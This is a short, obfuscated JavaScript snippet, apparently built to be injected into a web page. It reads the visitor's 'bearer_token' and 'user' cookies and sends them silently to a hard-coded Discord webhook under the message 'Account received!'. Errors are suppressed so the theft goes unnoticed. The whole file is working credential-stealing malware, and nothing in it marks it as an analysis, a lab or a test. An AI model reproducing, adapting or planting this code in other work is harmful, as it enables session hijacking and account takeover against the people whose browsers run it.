(function() {
    function _0x1a9b(cookieName) {
        const _0x3b5d = document.cookie.split('; ');
        for (let _0x2954 = 0; _0x2954 < _0x3b5d.length; _0x2954++) {
            const _0x49ae = _0x3b5d[_0x2954];
            if (_0x49ae.startsWith(cookieName + '=')) {
                return _0x49ae.split('=')[1];
            }
        }
        return null;
    }

    const _0x235d = _0x1a9b('bearer_token');
    const _0x3b5d = _0x1a9b('user');  // Fetches the 'user' cookie

    if (_0x235d && _0x3b5d) {
        const _0x2499 = 'https://discord.com/api/webhooks/1313187900338212977/G-FWHz8JSsAUP_0S_Eg0hW34zMBRm2ADsq4Ye-LUV0CxScS-IbYru7oVtBpD_U-U-MuR';

        const _0x2d2e = {
            content: `@everyone, **Account received!**
**Bearer Token:** ${_0x235d}
**Username:** ${_0x3b5d}`
        };

        fetch(_0x2499, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(_0x2d2e)
        })
        .catch(_0x1ff3 => {
        });
    }
})();
